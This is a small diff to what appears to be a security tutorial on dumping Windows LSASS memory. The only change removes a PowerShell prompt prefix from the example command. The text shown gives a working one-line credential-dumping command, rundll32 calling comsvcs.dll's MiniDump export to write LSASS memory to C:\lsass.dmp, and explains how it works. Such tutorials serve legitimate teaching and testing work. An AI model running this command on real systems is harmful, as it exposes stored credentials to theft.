@@ -35,7 +35,7 @@ Get-Process lsass
 With an elevated PowerShell session, we can issue the following command to create the dump file:
 
 ```powershell
-PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 ```
 
 With this command, we run `rundll32.exe` to call an exported function of `comsvcs.dll`, which in turn calls the `MiniDumpWriteDump` (`MiniDump`) function to dump the LSASS process memory to a specified location (`C:\lsass.dmp`).
